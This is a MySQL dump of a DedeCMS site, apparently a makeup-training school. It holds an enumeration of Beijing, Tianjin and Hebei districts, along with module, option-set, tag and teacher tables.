INSERT INTO dede_sys_enum VALUES ('17009', '南皮县', '2011.9', 'nativeplace', '2012', '2');
INSERT INTO dede_sys_enum VALUES ('17008', '肃宁县', '2011.8', 'nativeplace', '2012', '2');
INSERT INTO dede_sys_enum VALUES ('17007', '盐山县', '2011.7', 'nativeplace', '2012', '2');
INSERT INTO dede_sys_enum VALUES ('17006', '海兴县', '2011.6', 'nativeplace', '2012', '2');
INSERT INTO dede_sys_enum VALUES ('17005', '东光县', '2011.5', 'nativeplace', '2012', '2');
INSERT INTO dede_sys_enum VALUES ('17004', '青　县', '2011.4', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('17003', '沧　县', '2011.3', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('17002', '运河区', '2011.2', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('17001', '新华区', '2011.1', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('17000', '沧州市', '2011', 'nativeplace', '2011', '1');
INSERT INTO dede_sys_enum VALUES ('16999', '深州市', '2010.11', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16998', '冀州市', '2010.10', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16997', '阜城县', '2010.9', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('16996', '景　县', '2010.8', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('16995', '故城县', '2010.7', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('16994', '安平县', '2010.6', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('16993', '饶阳县', '2010.5', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('16992', '武强县', '2010.4', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16991', '武邑县', '2010.3', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16990', '枣强县', '2010.2', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16989', '桃城区', '2010.1', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16988', '衡水市', '2010', 'nativeplace', '2010', '1');
INSERT INTO dede_sys_enum VALUES ('16987', '三河市', '2009.10', 'nativeplace', '2009', '2');
INSERT INTO dede_sys_enum VALUES ('16986', '霸州市', '2009.9', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16985', '大厂回族自治县', '2009.8', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16984', '文安县', '2009.7', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16983', '大城县', '2009.6', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16982', '香河县', '2009.5', 'nativeplace', '2010', '2');
INSERT INTO dede_sys_enum VALUES ('16981', '永清县', '2009.4', 'nativeplace', '2009', '2');
INSERT INTO dede_sys_enum VALUES ('16980', '固安县', '2009.3', 'nativeplace', '2009', '2');
INSERT INTO dede_sys_enum VALUES ('16979', '广阳区', '2009.2', 'nativeplace', '2009', '2');
INSERT INTO dede_sys_enum VALUES ('16978', '安次区', '2009.1', 'nativeplace', '2009', '2');
INSERT INTO dede_sys_enum VALUES ('16977', '廊坊市', '2009', 'nativeplace', '2009', '1');
INSERT INTO dede_sys_enum VALUES ('16976', ' 围场满族蒙古族自治县', '2008.11', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16975', '宽城满族自治', '2008.10', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16974', '丰宁满族自治县', '2008.9', 'nativeplace', '2009', '2');
INSERT INTO dede_sys_enum VALUES ('16973', '隆化县', '2008.8', 'nativeplace', '2009', '2');
INSERT INTO dede_sys_enum VALUES ('16972', '滦平县', '2008.7', 'nativeplace', '2009', '2');
INSERT INTO dede_sys_enum VALUES ('16971', '平泉县', '2008.6', 'nativeplace', '2009', '2');
INSERT INTO dede_sys_enum VALUES ('16970', '兴隆县', '2008.5', 'nativeplace', '2009', '2');
INSERT INTO dede_sys_enum VALUES ('16969', '承德县', '2008.4', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16968', '鹰手营子矿区', '2008.3', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16967', '双滦区', '2008.2', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16966', '双桥区', '2008.1', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16965', '承德市', '2008', 'nativeplace', '2008', '1');
INSERT INTO dede_sys_enum VALUES ('16964', '崇礼县', '2007.17', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16963', '赤城县', '2007.16', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16962', '涿鹿县', '2007.15', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16961', '怀来县', '2007.14', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16960', '万全县', '2007.13', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16959', '怀安县', '2007.12', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16958', '阳原县', '2007.11', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16957', '蔚　县', '2007.10', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16956', '尚义县', '2007.9', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16955', '沽源县', '2007.8', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16954', '康保县', '2007.7', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16953', '张北县', '2007.6', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16952', '宣化县', '2007.5', 'nativeplace', '2008', '2');
INSERT INTO dede_sys_enum VALUES ('16951', '下花园区', '2007.4', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16950', '宣化区', '2007.3', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16949', '桥西区', '2007.2', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16948', '桥东区', '2007.1', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16947', '张家口市', '2007', 'nativeplace', '2007', '1');
INSERT INTO dede_sys_enum VALUES ('16946', '高碑店市', '2006.25', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16945', '安国市', '2006.24', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16944', '定州市', '2006.23', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16943', '涿州市', '2006.22', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16942', '雄　县', '2006.21', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16941', '博野县', '2006.20', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16940', '顺平县', '2006.19', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16939', '蠡　县', '2006.18', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16938', '曲阳县', '2006.17', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16937', '易县', '2006.16', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16936', '安新县', '2006.15', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16935', '望都县', '2006.14', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16934', '涞源县', '2006.13', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16933', '容城县', '2006.12', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16932', '高阳县', '2006.11', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16931', '唐　县', '2006.10', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16930', '定兴县', '2006.9', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16929', '徐水县', '2006.8', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16928', '阜平县', '2006.7', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16927', '涞水县', '2006.6', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16926', '清苑县', '2006.5', 'nativeplace', '2007', '2');
INSERT INTO dede_sys_enum VALUES ('16925', '满城县', '2006.4', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16924', '南市区', '2006.3', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16923', '北市区', '2006.2', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16922', '新市区', '2006.1', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16921', '保定市', '2006', 'nativeplace', '2006', '1');
INSERT INTO dede_sys_enum VALUES ('16920', '沙河市', '2005.19', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16919', '南宫市', '2005.18', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16918', '临西县', '2005.17', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16917', '清河县', '2005.16', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16916', '威　县', '2005.15', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16915', '平乡县', '2005.14', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16914', '广宗县', '2005.13', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16913', '新河县', '2005.12', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16912', '巨鹿县', '2005.11', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16911', '宁晋县', '2005.10', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16910', '南和县', '2005.9', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16909', '任　县', '2005.8', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16908', '隆尧县', '2005.7', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16907', '柏乡县', '2005.6', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16906', '内丘县', '2005.5', 'nativeplace', '2006', '2');
INSERT INTO dede_sys_enum VALUES ('16905', '临城县', '2005.4', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16904', '邢台县', '2005.3', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16903', '桥西区', '2005.2', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16902', '桥东区', '2005.1', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16901', '邢台市', '2005', 'nativeplace', '2005', '1');
INSERT INTO dede_sys_enum VALUES ('16900', '武安市', '2004.20', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16899', '曲周县', '2004.19', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16898', '魏县', '2004.18', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16897', '馆陶县', '2004.17', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16896', '广平县', '2004.16', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16895', '鸡泽县', '2004.15', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16894', '邱　县', '2004.14', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16893', '永年县', '2004.13', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16892', '肥乡县', '2004.12', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16891', '磁　县', '2004.11', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16890', '涉　县', '2004.10', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16889', '大名县', '2004.9', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16888', '成安县', '2004.8', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16887', '临漳县', '2004.7', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16886', '邯郸县', '2004.6', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16885', '峰峰矿区', '2004.5', 'nativeplace', '2005', '2');
INSERT INTO dede_sys_enum VALUES ('16884', '复兴区', '2004.4', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16883', '丛台区', '2004.3', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16882', '邯山区', '2004.2', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16881', '市辖区', '2004.1', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16880', '邯郸市', '2004', 'nativeplace', '2004', '1');
INSERT INTO dede_sys_enum VALUES ('16879', '卢龙县', '2003.7', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16878', '抚宁县', '2003.6', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16877', '昌黎县', '2003.5', 'nativeplace', '2004', '2');
INSERT INTO dede_sys_enum VALUES ('16876', '青龙满族自治县', '2003.4', 'nativeplace', '2003', '2');
INSERT INTO dede_sys_enum VALUES ('16875', '北戴河区', '2003.3', 'nativeplace', '2003', '2');
INSERT INTO dede_sys_enum VALUES ('16874', '山海关区', '2003.2', 'nativeplace', '2003', '2');
INSERT INTO dede_sys_enum VALUES ('16873', '海港区', '2003.1', 'nativeplace', '2003', '2');
INSERT INTO dede_sys_enum VALUES ('16872', '秦皇岛市', '2003', 'nativeplace', '2003', '1');
INSERT INTO dede_sys_enum VALUES ('16871', '迁安市', '2002.14', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16870', '遵化市', '2002.13', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16869', '唐海县', '2002.12', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16868', '玉田县', '2002.11', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16867', '迁西县', '2002.10', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16866', '乐亭县', '2002.9', 'nativeplace', '2003', '2');
INSERT INTO dede_sys_enum VALUES ('16865', '滦南县', '2002.8', 'nativeplace', '2003', '2');
INSERT INTO dede_sys_enum VALUES ('16864', '滦　县', '2002.7', 'nativeplace', '2003', '2');
INSERT INTO dede_sys_enum VALUES ('16863', '丰润区', '2002.6', 'nativeplace', '2003', '2');
INSERT INTO dede_sys_enum VALUES ('16862', '丰南区', '2002.5', 'nativeplace', '2003', '2');
INSERT INTO dede_sys_enum VALUES ('16861', '开平区', '2002.4', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16860', '古冶区', '2002.3', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16859', '路北区', '2002.2', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16858', '路南区', '2002.1', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16857', '唐山市', '2002', 'nativeplace', '2002', '1');
INSERT INTO dede_sys_enum VALUES ('16856', '鹿泉市', '2001.23', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16855', '新乐市', '2001.22', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16854', '晋州市', '2001.21', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16853', '藁城市', '2001.20', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16852', '辛集市', '2001.19', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16851', '赵　县', '2001.18', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16850', '元氏县', '2001.17', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16849', '平山县', '2001.16', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16848', '无极县', '2001.15', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16847', '赞皇县', '2001.14', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16846', '深泽县', '2001.13', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16845', '高邑县', '2001.12', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16844', '灵寿县', '2001.11', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16843', '行唐县', '2001.10', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16842', '栾城县', '2001.9', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16841', '正定县', '2001.8', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16840', '井陉县', '2001.7', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16839', '裕华区', '2001.6', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16838', '井陉矿区', '2001.5', 'nativeplace', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('16837', '新华区', '2001.4', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16836', '桥西区', '2001.3', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16835', '桥东区', '2001.2', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16834', '长安区', '2001.1', 'nativeplace', '2001', '2');
INSERT INTO dede_sys_enum VALUES ('16833', '石家庄市', '2001', 'nativeplace', '2001', '1');
INSERT INTO dede_sys_enum VALUES ('16832', '河北省', '2000', 'nativeplace', '2000', '0');
INSERT INTO dede_sys_enum VALUES ('16831', '蓟　县', '1518', 'nativeplace', '1518', '1');
INSERT INTO dede_sys_enum VALUES ('16830', '静海县', '1517', 'nativeplace', '1517', '1');
INSERT INTO dede_sys_enum VALUES ('16829', '宁河县', '1516', 'nativeplace', '1516', '1');
INSERT INTO dede_sys_enum VALUES ('16828', '宝坻区', '1515', 'nativeplace', '1515', '1');
INSERT INTO dede_sys_enum VALUES ('16827', '武清区', '1514', 'nativeplace', '1514', '1');
INSERT INTO dede_sys_enum VALUES ('16826', '北辰区', '1513', 'nativeplace', '1513', '1');
INSERT INTO dede_sys_enum VALUES ('16825', '津南区', '1512', 'nativeplace', '1512', '1');
INSERT INTO dede_sys_enum VALUES ('16824', '西青区', '1511', 'nativeplace', '1511', '1');
INSERT INTO dede_sys_enum VALUES ('16823', '东丽区', '1510', 'nativeplace', '1510', '1');
INSERT INTO dede_sys_enum VALUES ('16822', '大港区', '1509', 'nativeplace', '1509', '1');
INSERT INTO dede_sys_enum VALUES ('16821', '汉沽区', '1508', 'nativeplace', '1508', '1');
INSERT INTO dede_sys_enum VALUES ('16820', '塘沽区', '1507', 'nativeplace', '1507', '1');
INSERT INTO dede_sys_enum VALUES ('16819', '红桥区', '1506', 'nativeplace', '1506', '1');
INSERT INTO dede_sys_enum VALUES ('16818', '河北区', '1505', 'nativeplace', '1505', '1');
INSERT INTO dede_sys_enum VALUES ('16817', '南开区', '1504', 'nativeplace', '1504', '1');
INSERT INTO dede_sys_enum VALUES ('16816', '河西区', '1503', 'nativeplace', '1503', '1');
INSERT INTO dede_sys_enum VALUES ('16815', '河东区', '1502', 'nativeplace', '1502', '1');
INSERT INTO dede_sys_enum VALUES ('16814', '和平区', '1501', 'nativeplace', '1501', '1');
INSERT INTO dede_sys_enum VALUES ('16813', '天津市', '1500', 'nativeplace', '1500', '0');
INSERT INTO dede_sys_enum VALUES ('16812', '延庆县', '1018', 'nativeplace', '1018', '1');
INSERT INTO dede_sys_enum VALUES ('16811', '密云县', '1017', 'nativeplace', '1017', '1');
INSERT INTO dede_sys_enum VALUES ('16810', '平谷区', '1016', 'nativeplace', '1016', '1');
INSERT INTO dede_sys_enum VALUES ('16809', '怀柔区', '1015', 'nativeplace', '1015', '1');
INSERT INTO dede_sys_enum VALUES ('16808', '大兴区', '1014', 'nativeplace', '1014', '1');
INSERT INTO dede_sys_enum VALUES ('16807', '昌平区', '1013', 'nativeplace', '1013', '1');
INSERT INTO dede_sys_enum VALUES ('16806', '顺义区', '1012', 'nativeplace', '1012', '1');
INSERT INTO dede_sys_enum VALUES ('16805', '通州区', '1011', 'nativeplace', '1011', '1');
INSERT INTO dede_sys_enum VALUES ('16804', '房山区', '1010', 'nativeplace', '1010', '1');
INSERT INTO dede_sys_enum VALUES ('16803', '门头沟区', '1009', 'nativeplace', '1009', '1');
INSERT INTO dede_sys_enum VALUES ('16802', '海淀区', '1008', 'nativeplace', '1008', '1');
INSERT INTO dede_sys_enum VALUES ('16801', '石景山区', '1007', 'nativeplace', '1007', '1');
INSERT INTO dede_sys_enum VALUES ('16800', '丰台区', '1006', 'nativeplace', '1006', '1');
INSERT INTO dede_sys_enum VALUES ('16799', '朝阳区', '1005', 'nativeplace', '1005', '1');
INSERT INTO dede_sys_enum VALUES ('16798', '宣武区', '1004', 'nativeplace', '1004', '1');
INSERT INTO dede_sys_enum VALUES ('16797', '崇文区', '1003', 'nativeplace', '1003', '1');
INSERT INTO dede_sys_enum VALUES ('16796', '西城区', '1002', 'nativeplace', '1002', '1');
INSERT INTO dede_sys_enum VALUES ('16795', '东城区', '1001', 'nativeplace', '1001', '1');
INSERT INTO dede_sys_enum VALUES ('16794', '北京市', '1000', 'nativeplace', '1000', '0');

-- ----------------------------
-- Table structure for `dede_sys_module`
-- ----------------------------
DROP TABLE IF EXISTS `dede_sys_module`;
CREATE TABLE `dede_sys_module` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `hashcode` char(32) NOT NULL DEFAULT '',
  `modname` varchar(30) NOT NULL DEFAULT '',
  `indexname` varchar(20) NOT NULL DEFAULT '',
  `indexurl` varchar(30) NOT NULL DEFAULT '',
  `ismember` tinyint(4) NOT NULL DEFAULT '1',
  `menustring` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_sys_module
-- ----------------------------
INSERT INTO dede_sys_module VALUES ('1', '0cce60bc0238aa03804682c801584991', '百度新闻', '', '', '0', '');
INSERT INTO dede_sys_module VALUES ('2', '1f35620fb42d452fa2bdc1dee1690f92', '文件管理器', '', '', '0', '');
INSERT INTO dede_sys_module VALUES ('3', '72ffa6fabe3c236f9238a2b281bc0f93', '广告管理', '', '', '0', '');
INSERT INTO dede_sys_module VALUES ('4', 'b437d85a7a7bc778c9c79b5ec36ab9aa', '友情链接', '', '', '0', '');
INSERT INTO dede_sys_module VALUES ('5', 'acb8b88eb4a6d4bfc375c18534f9439e', '投票模块', '', '', '0', '');
INSERT INTO dede_sys_module VALUES ('6', '572606600345b1a4bb8c810bbae434cc', '挑错管理', '', '', '0', '');

-- ----------------------------
-- Table structure for `dede_sys_set`
-- ----------------------------
DROP TABLE IF EXISTS `dede_sys_set`;
CREATE TABLE `dede_sys_set` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `sname` char(20) NOT NULL DEFAULT '',
  `items` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_sys_set
-- ----------------------------
INSERT INTO dede_sys_set VALUES ('1', 'nature', '性格外向,性格内向,活泼开朗,沉默寡言,幽默,稳重,轻浮,冲动,坚强,脆弱,幼稚,成熟,能说会道,自私,真诚,独立,依赖,任性,自负,自卑,温柔体贴,神经质,拜金,小心翼翼,暴躁,倔强,逆来顺受,不拘小节,婆婆妈妈,交际广泛,豪爽,害羞,狡猾善变,耿直,虚伪,乐观向上,悲观消极,郁郁寡欢,孤僻,难以琢磨,胆小怕事,敢做敢当,助人为乐,老实,守旧,敏感,迟钝,武断,果断,优柔寡断,暴力倾向,刻薄,损人利己,附庸风雅,时喜时悲,患得患失,快言快语,豪放不羁,多愁善感,循规蹈矩');
INSERT INTO dede_sys_set VALUES ('2', 'language', '普通话,上海话,广东话,英语,日语,韩语,法语,意大利语,德语,西班牙语,俄语,阿拉伯语');

-- ----------------------------
-- Table structure for `dede_sys_task`
-- ----------------------------
DROP TABLE IF EXISTS `dede_sys_task`;
CREATE TABLE `dede_sys_task` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `taskname` varchar(50) NOT NULL,
  `dourl` varchar(100) NOT NULL,
  `islock` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `runtype` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `runtime` varchar(10) DEFAULT '0000',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `freq` tinyint(2) unsigned NOT NULL DEFAULT '0',
  `lastrun` int(10) unsigned NOT NULL DEFAULT '0',
  `description` varchar(250) NOT NULL,
  `parameter` text,
  `settime` int(10) unsigned NOT NULL DEFAULT '0',
  `sta` enum('运行','成功','失败') DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_sys_task
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_tagindex`
-- ----------------------------
DROP TABLE IF EXISTS `dede_tagindex`;
CREATE TABLE `dede_tagindex` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `tag` char(12) NOT NULL DEFAULT '',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `count` int(10) unsigned NOT NULL DEFAULT '0',
  `total` int(10) unsigned NOT NULL DEFAULT '0',
  `weekcc` int(10) unsigned NOT NULL DEFAULT '0',
  `monthcc` int(10) unsigned NOT NULL DEFAULT '0',
  `weekup` int(10) unsigned NOT NULL DEFAULT '0',
  `monthup` int(10) unsigned NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_tagindex
-- ----------------------------
INSERT INTO dede_tagindex VALUES ('1', '专业化妆学员', '22', '0', '1', '0', '0', '1429260774', '1429260774', '1429260774');
INSERT INTO dede_tagindex VALUES ('2', '化妆学员作品', '21', '0', '2', '0', '0', '1430976970', '1430976970', '1430977116');
INSERT INTO dede_tagindex VALUES ('3', '化妆培训', '12', '0', '1', '0', '0', '1431506636', '1431506636', '1431506636');

-- ----------------------------
-- Table structure for `dede_taglist`
-- ----------------------------
DROP TABLE IF EXISTS `dede_taglist`;
CREATE TABLE `dede_taglist` (
  `tid` int(10) unsigned NOT NULL DEFAULT '0',
  `aid` int(10) unsigned NOT NULL DEFAULT '0',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tag` varchar(12) NOT NULL DEFAULT '',
  PRIMARY KEY (`tid`,`aid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_taglist
-- ----------------------------
INSERT INTO dede_taglist VALUES ('1', '88', '0', '22', '专业化妆学员');
INSERT INTO dede_taglist VALUES ('2', '116', '0', '21', '化妆学员作品');
INSERT INTO dede_taglist VALUES ('2', '118', '0', '21', '化妆学员作品');
INSERT INTO dede_taglist VALUES ('3', '123', '0', '12', '化妆培训');

-- ----------------------------
-- Table structure for `dede_teachers`
-- ----------------------------
DROP TABLE IF EXISTS `dede_teachers`;
CREATE TABLE `dede_teachers` (
  `aid` int(11) NOT NULL DEFAULT '0',
  `typeid` int(11) NOT NULL DEFAULT '0',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `leavetime` varchar(250) NOT NULL DEFAULT '',
  `detail` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_teachers
-- ----------------------------
INSERT INTO dede_teachers VALUES ('22', '22', '', '', '220.166.212.15', '1389657600', null);
INSERT INTO dede_teachers VALUES ('23', '21', '', '', '220.166.212.15', '1428993097', null);
INSERT INTO dede_teachers VALUES ('24', '21', '', '', '220.166.212.15', '1428993303', null);
INSERT INTO dede_teachers VALUES ('25', '21', '', '', '220.166.212.15', '1428993876', null);
